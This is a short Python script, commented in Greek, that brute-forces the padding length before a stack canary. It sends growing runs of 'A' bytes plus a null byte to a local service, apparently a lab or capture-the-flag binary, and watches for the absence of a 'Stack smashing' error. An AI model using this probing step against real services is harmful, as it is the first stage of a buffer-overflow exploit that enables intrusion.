import socket

host, port = '127.0.0.1', 28285

print("--- Searching for Correct Padding ---")
for pad in range(100, 140):
    # Στέλνουμε το padding και το πρώτο byte του καναρινιού (\x00)
    # Αν το padding είναι σωστό, το \x00 θα κάτσει ακριβώς πάνω στο πρώτο byte 
    # του καναρινιού και ΔΕΝ θα έχουμε stack smashing.
    payload = b"A" * pad + b"\x00"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((host, port))
        s.sendall(payload)
        res = s.recv(1024)
        
        if b"Twit" in res and b"Stack smashing" not in res:
            print(f"[!] SUCCESS! Canary starts after {pad} bytes.")
            s.close()
            break
        s.close()
    except:
        continue